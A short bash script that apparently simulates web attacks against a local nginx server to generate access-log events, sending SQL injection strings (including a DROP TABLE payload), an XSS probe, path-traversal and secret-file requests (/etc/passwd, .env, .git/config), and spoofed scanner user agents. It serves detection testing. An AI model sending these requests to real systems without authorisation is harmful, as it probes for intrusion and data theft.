#!/bin/bash
# Simulates common web attacks against local nginx
# Events appear in /var/log/nginx/access.log

TARGET="http://192.168.253.151"
echo "[*] Starting web attack simulation against $TARGET"

# SQL injection
curl -s "$TARGET/?id=1'%20OR%20'1'='1" -o /dev/null
curl -s "$TARGET/login?user=admin'--&pass=x" -o /dev/null
curl -s "$TARGET/?search=1;DROP%20TABLE%20users--" -o /dev/null

# XSS
curl -s "$TARGET/?q=<script>alert('xss')</script>" -o /dev/null

# Directory traversal
curl -s "$TARGET/../../../etc/passwd" -o /dev/null
curl -s "$TARGET/.env" -o /dev/null
curl -s "$TARGET/.git/config" -o /dev/null

# Common scanner paths
curl -s "$TARGET/wp-admin/" -o /dev/null
curl -s "$TARGET/phpmyadmin/" -o /dev/null
curl -s "$TARGET/admin/config.php" -o /dev/null
curl -s "$TARGET/shell.php" -o /dev/null

# Fake scanner user agents
curl -s -A "sqlmap/1.7.8#stable" "$TARGET/" -o /dev/null
curl -s -A "Nikto/2.1.6" "$TARGET/" -o /dev/null
curl -s -A "masscan/1.3" "$TARGET/" -o /dev/null

echo "[*] Done. Verify with: sudo tail -30 /var/log/nginx/access.log"
